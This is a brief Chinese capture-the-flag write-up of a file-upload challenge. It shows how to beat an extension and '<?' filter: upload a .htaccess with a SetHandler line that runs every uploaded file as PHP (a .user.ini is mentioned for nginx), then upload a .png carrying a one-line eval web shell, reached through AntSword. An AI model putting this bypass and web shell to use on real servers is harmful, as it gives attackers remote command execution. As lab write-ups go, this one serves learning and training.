# 知识点：

# 1.文件上传

# 2. .htaccess将所有上传文件解析成php文件

# 3.  <? 被过滤时的js写法



1.判断什么文件可以上传

发现后缀名不能存在ph

而且，文件不能含有太多内容，否则什么文件都不能上传



2. 发现文件类型为：

```javascript
Content-Type: image/jpeg
```

文件内容较少时可以上传，搞不懂



3. 上传webshell

3.1 上传.htaccess文件

```javascript
SetHandler application/x-httpd-php
```



在nginx服务器时可以上传 user.ini文件



3.2 上传png结尾的图片

```javascript
<script language="php">eval($_POST['a']);</script>
```





4. 蚁剑连上，根目录找到flag